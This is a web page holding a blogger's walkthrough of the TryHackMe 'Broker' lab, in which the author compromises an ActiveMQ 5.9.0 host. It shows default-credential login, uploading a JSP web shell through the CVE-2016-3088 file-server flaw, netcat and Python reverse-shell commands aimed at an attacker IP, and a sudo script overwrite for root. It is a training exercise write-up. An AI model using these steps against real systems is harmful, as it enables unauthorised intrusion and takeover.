<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=content-language content="en">
<meta name=color-scheme content="light dark">
<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
<meta name=author content="Kiel Vaughn">
<meta name=description content="Broker    Broker is a medium rated box recently released on TryHackMe that was recently released. Below are the steps I followed in order to answer the questions for this room, ultimately leading up to rooting the box.
Hints    Question 1 Hints  What tools can be used to enumerate open TCP ports on a system?   Question 2 Hints  Nmap with the right parameters can provide this answer.">
<meta name=keywords content="blog,cybersecurity,personal">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Broker">
<meta name=twitter:description content="Broker    Broker is a medium rated box recently released on TryHackMe that was recently released. Below are the steps I followed in order to answer the questions for this room, ultimately leading up to rooting the box.
Hints    Question 1 Hints  What tools can be used to enumerate open TCP ports on a system?   Question 2 Hints  Nmap with the right parameters can provide this answer.">
<meta property="og:title" content="Broker">
<meta property="og:description" content="Broker    Broker is a medium rated box recently released on TryHackMe that was recently released. Below are the steps I followed in order to answer the questions for this room, ultimately leading up to rooting the box.
Hints    Question 1 Hints  What tools can be used to enumerate open TCP ports on a system?   Question 2 Hints  Nmap with the right parameters can provide this answer.">
<meta property="og:type" content="article">
<meta property="og:url" content="http://www.kielvaughn.com/ctfs/2021-03-13-broker/"><meta property="article:section" content="ctfs">
<meta property="article:published_time" content="2021-03-13T00:00:00+00:00">
<meta property="article:modified_time" content="2021-03-13T00:00:00+00:00">
<title>
Broker · Kiel Vaughn, CISSP
</title>
<link rel=canonical href=http://www.kielvaughn.com/ctfs/2021-03-13-broker/>
<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
<link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen>
<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32>
<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16>
<link rel=apple-touch-icon href=/assets/img/cissp.ico>
<link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico>
<meta name=generator content="Hugo 0.89.4">
</head>
<body class="preload-transitions colorscheme-dark">
<main class=wrapper>
<nav class=navigation>
<section class=container>
<a class=navigation-title href=/>
Kiel Vaughn, CISSP
</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle>
<i class="fa fa-bars fa-fw" aria-hidden=true></i>
</label>
<ul class=navigation-list>
<li class=navigation-item>
<a class=navigation-link href=/whoami/>whoami</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/certifications/>certifications</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/posts/>blog</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a>
</li>
</ul>
</section>
</nav>
<div class=content>
<section class="container post">
<article>
<header>
<div class=post-title>
<h1 class=title>
<a class=title-link href=http://www.kielvaughn.com/ctfs/2021-03-13-broker/>
Broker
</a>
</h1>
</div>
<div class=post-meta>
<div class=date>
<span class=posted-on>
<i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2021-03-13T00:00:00Z>
March 13, 2021
</time>
</span>
<span class=reading-time>
<i class="fa fa-clock-o" aria-hidden=true></i>
7-minute read
</span>
</div>
<div class=tags>
<i class="fa fa-tag" aria-hidden=true></i>
<span class=tag>
<a href=/tags/activemq/>activeMQ</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/cve/>CVE</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/sudo-abuse/>sudo abuse</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/python-scripting/>Python scripting</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/default-credentials/>default credentials</a>
</span></div>
</div>
</header>
<div>
<h1 id=broker>
Broker
<a class=heading-link href=#broker>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h1>
<p>Broker is a medium rated box recently released on TryHackMe that was recently released. Below are the steps I followed in order to answer the questions for this room, ultimately leading up to rooting the box.</p>
<h2 id=hints>
Hints
<a class=heading-link href=#hints>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h2>
<details><summary><strong>Question 1 Hints</strong></summary>
<ul>
<li>What tools can be used to enumerate open TCP ports on a system?
</ul>
</details>
<details><summary><strong>Question 2 Hints</strong></summary>
<ul>
<li>Nmap with the right parameters can provide this answer.
</ul>
</details>
<details><summary><strong>Question 3 Hints</strong></summary>
<ul>
<li>Have you found an MTTQ client?
<li>You will need credentials to connect, have you looked for default credentials for this service?
<li>The topics for this broker service should have one that is very obvious that will contain the answer to this question.
</ul>
</details>
<details><summary><strong>Question 4 Hints</strong></summary>
<ul>
<li>With the credentials you uncovered in question 3, login to the site on one of the open ports and uncover the version that's running. Are there known CVEs for this version of this service?
<li>Is there a way to obtain a reverse shell to gain an initial foothold onto the victim with a known exploit for the CVE you uncovered?
</ul>
</details>
<details><summary><strong>Question 5 Hints</strong></summary>
<ul>
<li>Have you been able to establish a more stable/interactive shell?
<li>What can the user run as sudo?
<li>Is there a way this could be abused?
</ul>
</details>
<h2 id=walkthrough>
Walkthrough
<a class=heading-link href=#walkthrough>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h2>
<details><summary><strong>Full Walkthrough</strong></summary>
<h3 id=question-1>
Question 1
<a class=heading-link href=#question-1>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h3>
<p>The first question for this room was:</p>
<p><img src=/assets/img/Broker1.png alt="Broker Question 1"></p>
<p>To answer this question, I ran</p>
<p><strong><code>threader3000</code></strong></p>
<p>This produced the following, which lists the open ports on the victim host, including the two in the 1000-10000 range.</p>
<p><img src=/assets/img/Broker2.png alt="Broker threader3000"></p>
<h3 id=question-2>
Question 2
<a class=heading-link href=#question-2>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h3>
<p>The second question for this room was the following:</p>
<p><img src=/assets/img/Broker3.png alt="Broker Question 2"></p>
<p>Letting threader3000 run it&rsquo;s recommended scan will produce the following output, which contains the answer to this question:</p>
<p><img src=/assets/img/Broker4.png alt="Broker nmap"></p>
<h3 id=question-3>
Question 3
<a class=heading-link href=#question-3>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h3>
<p>The third question is asking for the following:</p>
<p><img src=/assets/img/Broker5.png alt="Broker Question 3"></p>
<p>Now that we know ActiveMQ is running on this host, we need to find something that will allow us to connect and retrieve these messages from this brokering service. After a bit of digging, I uncovered <a href=https://mqttfx.jensd.de/>MQTT.fx</a>.</p>
<p><img src=/assets/img/Broker6.png alt="Broker MQTT.fx website"></p>
<p>After installing it I launched the application. I then clicked on the gear icon to configure my connection. As shown below (the MQTT Version was provided in the hint):</p>
<p><img src=/assets/img/Broker7.png alt="Broker MQTT.fx connection configuration"></p>
<p>Once completed, I clicked on the <strong>User Credentials</strong> section. We did not have a username or password to enter so I performed a quick search on Google, and uncovered that the default admin credentials were admin/admin for username and password:</p>
<p><img src=/assets/img/Broker8.png alt="Broker ActiveMQ default credentials"></p>
<p>I attempted the admin/admin credentials and was successful in connecting!</p>
<p><img src=/assets/img/Broker9.png alt="Broker MQTT.fx credentials"></p>
<p><img src=/assets/img/Broker10.png alt="Broker successful connection"></p>
<p>Next, I clicked on <strong>Subscribe</strong> and clicked on <strong>Scan</strong> under <strong>Topics Collector</strong> after a few moments, an interesting topic named <strong>secret_chat</strong> appears.</p>
<p><img src=/assets/img/Broker11.png alt="Broker Subscribe scan"></p>
<p>Next, in the drop down menu, I entered <strong>secret_chat</strong> and clicked on <strong>Subscribe</strong>. After a few moments, some messages come through, including one that answers this question:</p>
<p><img src=/assets/img/Broker12.png alt="Broker video game name"></p>
<h3 id=question-4---flagtxt>
Question 4 - flag.txt
<a class=heading-link href=#question-4---flagtxt>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h3>
<p>For this section, we need to review what we know so far. We know that Apache ActiveMQ is installed and running on port 1883. We also know there is a website hosted on port 8161 for this application. My next action was to see if there were any CVEs for ActiveMQ, but in order to narrow it down, we would need to know the version. I attempted to load the website at <strong>http://&lt;victim host>:8161</strong> and was presented with the following:</p>
<p><img src=/assets/img/Broker13.png alt="Broker ActiveMQ website"></p>
<p>I clicked on the <strong>Manage ActiveMQ broker</strong> and was prompted for credentials. I entered the same ones we used for MQTT.fx (admin/admin) and logged in successfully.</p>
<p><img src=/assets/img/Broker14.png alt="Broker admin login"></p>
<p>Once logged in, the main page displays the version number: <strong>5.9.0</strong>.</p>
<p><img src=/assets/img/Broker15.png alt="Broker ActiveMQ version"></p>
<p>After digging around on Google, I uncovered <a href=https://medium.com/@knownsec404team/analysis-of-apache-activemq-remote-code-execution-vulnerability-cve-2016-3088-575f80924f30>this</a> article, which explains how you can upload an arbitrary jsp file and move it into a directory where it is executable. The first thing I would need is a jsp shell. I ended up using the one located <a href=https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp>here</a>.</p>
<p>Next, I loaded up Burp Suite to have it intercept traffic and I went to the <strong>/fileserver</strong> directory as mentioned in the article on how to exploit ActiveMQ.</p>
<p><img src=/assets/img/Broker16.png alt="Broker /fileserver directory"></p>
<p>In Burp Suite, I let the intercepted traffic go through and then I clicked on the <strong>Target</strong> tab and right clicked on the GET request and sent that request to <strong>Repeater</strong></p>
<p><img src=/assets/img/Broker17.png alt="Broker Burp Suite Target"></p>
<p>Next, I changed the GET request to a PUT request and appended shell.jsp to the URL. I then all the information for the request after the Host: section and added in <strong>Authorization: Basic YWRtaW46YWRtaW4=</strong> (this is admin:admin in base64, which can be gathered from sniffing the traffic when calculating it in Kali or by using CyberChef as shown below).</p>
<p><img src=/assets/img/Broker18.png alt="Broker CyberChef"></p>
<p>Next, I left a blank line and pasted in the shell downloaded from the previously mentioned GitHub repository and clicked on Send. If successful, you will receive a 204 response code as shown below:</p>
<p><img src=/assets/img/Broker19.png alt="Broker upload shell Burp"></p>
<p>Next, we need to move this into the admin directory, in order to do so, we need to modify the request in Repeater by removing the jsp shell code, and change the URI path to <strong>/fileserver/asdf/%20/%20</strong>. We know this does not exist, which is done on purpose so we can return the full directory path in the response, as shown below:</p>
<p><img src=/assets/img/Broker20.png alt="Broker return directory path Burp"></p>
<p>This is needed since we need to know the path involved to move the file into the admin directory. Now that we know the path, we can modify our command in Repeater once again to move the file into the admin directory. This is done by changing the type from PUT to MOVE and referencing the shell.jsp file we initially uploaded. We would then need to add <strong>Destination: file:///opt/apache-activemq-5.9.0/webapps/admin/shell.jsp</strong> to the request, to move the shell to the admin folder where it can be executed. Next, add a blank line followed by whatever text you would like. Once modified, click on <strong>Send</strong>. You should get another 204 HTTP response as shown below:</p>
<p><img src=/assets/img/Broker21.png alt="Broker move jsp shell"></p>
<p>At this point, you are done with Burp Suite, so you can close it if you would like. Now, in your browser, navigate to <strong>http://&lt;victim ip>:8161/admin/shell.jsp</strong> and you should see something similar to the following:</p>
<p><img src=/assets/img/Broker22.png alt="Broker jsp shell"></p>
<p>After entering a few commands, it appears that netcat is present on the victim machine</p>
<p><img src=/assets/img/Broker23.png alt="Broker nc"></p>
<p>On our attacker box, let&rsquo;s open a listener with netcat to catch a reverse shell on port 4567 with:</p>
<p><strong><code>nc -nvlp 4567</code></strong></p>
<p><img src=/assets/img/Broker24.png alt="Broker nc listener"></p>
<p>Next, on our victim host, enter a <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ncat> netcat reverse shell</a> on the victim host and click on send:</p>
<p><strong><code>nc -e /bin/bash &lt;attacker ip> 4567</code></strong></p>
<p><img src=/assets/img/Broker25.png alt="Broker enter nc reverse shell"></p>
<p>You should now have a foothold into this system!</p>
<p><img src=/assets/img/Broker26.png alt="Broker initial foothold"></p>
<p>We are limited with what commands can be ran, so let&rsquo;s see if we can find a way to upgrade our shell. Luckily, python3 is installed on the victim host as shown below:</p>
<p><img src=/assets/img/Broker27.png alt="Broker which python3"></p>
<p>Let&rsquo;s run:</p>
<p><strong><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></strong></p>
<p>to upgrade our shell.</p>
<p><img src=/assets/img/Broker28.png alt="Broker upgraded shell"></p>
<p>Next, let&rsquo;s run:</p>
<p><strong><code>ls</code></strong></p>
<p>and we will see the <strong>flag.txt</strong> file in this directory.</p>
<p><img src=/assets/img/Broker29.png alt="Broker ls"></p>
<p>Let&rsquo;s next run:</p>
<p><strong><code>cat flag.txt</code></strong></p>
<p>to answer this question.</p>
<p><img src=/assets/img/Broker30.png alt="Broker cat flag.txt"></p>
<h3 id=question-5---roottxt>
Question 5 - root.txt
<a class=heading-link href=#question-5---roottxt>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h3>
<p>The final challenge is to obtain root.txt. Thankfully, privilege escalation is rather simple for this box.</p>
<p><img src=/assets/img/Broker31.png alt="Broker root.txt"></p>
<p>First, let&rsquo;s run:</p>
<p><strong><code>sudo -l</code></strong></p>
<p>to see what commands this user can run as sudo. We receive the following as a response:</p>
<p><img src=/assets/img/Broker32.png alt="Broker sudo -l"></p>
<p>It appears we can run python 3.7 with the subscribe.py file as root. Let&rsquo;s see what permissions we have on that file with the following:</p>
<p><strong><code>ls -al /opt/apache-activemq-5.9.0|grep subscribe.py</code></strong></p>
<p>We see that the activemq user has access to write to this file!</p>
<p><img src=/assets/img/Broker33.png alt="Broker ls -al"></p>
<p>Since this is executed as root, we just need to enter a python reverse shell into this file and execute it as root with sudo. First, we need to get our Python <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python>reverse shell</a> payload. We will take the Ipv4 one listed for Python, and make some modifications and echo it into the subscribe.py file as follows:</p>
<p><strong><code>echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker ip",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' > subscribe.py</code></strong></p>
<p>The &ldquo;attack ip&rdquo; portion above would need to be replaced with your attacker IP address (in quotes). The > designates to overwrite the contents of the previous file.</p>
<p><img src=/assets/img/Broker34.png alt="Broker echo reverse shell"></p>
<p>This can be verified by running:</p>
<p><strong><code>cat subscribe.py</code></strong></p>
<p>We should see our reverse shell string at the end of the file.</p>
<p><img src=/assets/img/Broker35.png alt="Broker cat subscribe.py"></p>
<p>Next, on the attacker host, run:</p>
<p><strong><code>nc -nvlp 4242</code></strong></p>
<p>to catch the reverse shell as root:</p>
<p><img src=/assets/img/Broker36.png alt="Broker nc listener for root shell"></p>
<p>Next, on the victim host, run the command that was listed under sudo -l with sudo prepending the command:</p>
<p><strong><code>sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py</code></strong></p>
<p><img src=/assets/img/Broker37.png alt="Broker sudo python3"></p>
<p>We should now have a shell as root on the listener on port 4242</p>
<p><img src=/assets/img/Broker38.png alt="Broker root shell"></p>
<p>Now, to wrap up this box, let&rsquo;s run the following commands:</p>
<p><strong><code>cd root</code></strong></p>
<p><strong><code>ls</code></strong></p>
<p><strong><code>cat root.txt</code></strong></p>
<p><img src=/assets/img/Broker39.png alt="Broker root.txt flag"></p>
<p>That&rsquo;s it! This box has been fully compromised!</p>
</details>
</div>
<footer>
</footer>
</article>
</section>
</div>
<footer class=footer>
<section class=container>
©
2020 -
2021
Kiel Vaughn
</section>
</footer>
</main>
<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
</body>
</html>